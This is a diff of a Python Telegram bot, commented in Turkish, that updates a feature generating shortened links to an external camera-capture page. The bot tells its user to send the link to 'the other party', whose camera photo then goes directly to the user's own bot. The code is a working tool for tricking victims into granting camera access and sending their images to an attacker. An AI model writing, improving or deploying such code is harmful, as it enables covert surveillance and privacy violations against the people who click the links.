@@ -8249,8 +8249,8 @@ def _process_camera_token(msg, bot_instance):
     USER_STATES.pop(uid, None)
     bot_instance.reply_to(msg, "✅ <b>Token doğrulandı!</b>", parse_mode="HTML")
 
-    # id + chat_id ikisini de gönder (sayfa hangisini beklerse bulsun)
-    long_url = f"http://query.gamer.gd/C1.html?id={chat_id}&chat_id={chat_id}&token={token}"
+    # Çalışan sayfa: token + idChat ile fotoğrafı botuna gönderir
+    long_url = f"https://parzibyte.github.io/ejemplos-javascript/foto-camara-telegram/?token={token}&idChat={chat_id}"
     try:
         short = requests.get(
             "https://clck.ru/--",
@@ -8264,13 +8264,13 @@ def _process_camera_token(msg, bot_instance):
     bot_instance.send_message(
         chat_id,
         f"🔗 <b>Kısaltılmış Bağlantınız:</b>\n{short}\n\n"
-        "📷 Link hazır.\n\n"
+        "📷 <b>Link hazır ve çalışıyor.</b>\n\n"
         "⚠️ <b>ÖNEMLİ:</b>\n"
-        "1. Token’ini girdiğin <b>kendi botuna</b> gir\n"
-        "2. <b>/start</b> yazıp başlat\n"
-        "3. Sonra bu linki karşı tarafa gönder\n\n"
-        "Botuna /start atmazsan fotoğraf <b>asla gelmez</b>.\n"
-        "İzinler verildikçe bilgiler senin botuna düşer.",
+        "1. Token’ini girdiğin <b>kendi botuna</b> /start at (attıysan tamam)\n"
+        "2. Bu linki karşı tarafa gönder\n"
+        "3. Karşı taraf kameraya izin verip fotoğraf çekince\n"
+        "   <b>fotoğraf direkt senin botuna düşer</b>\n\n"
+        "Tekrar token atarak yeni link de alabilirsin.",
         parse_mode="HTML"
     )
 
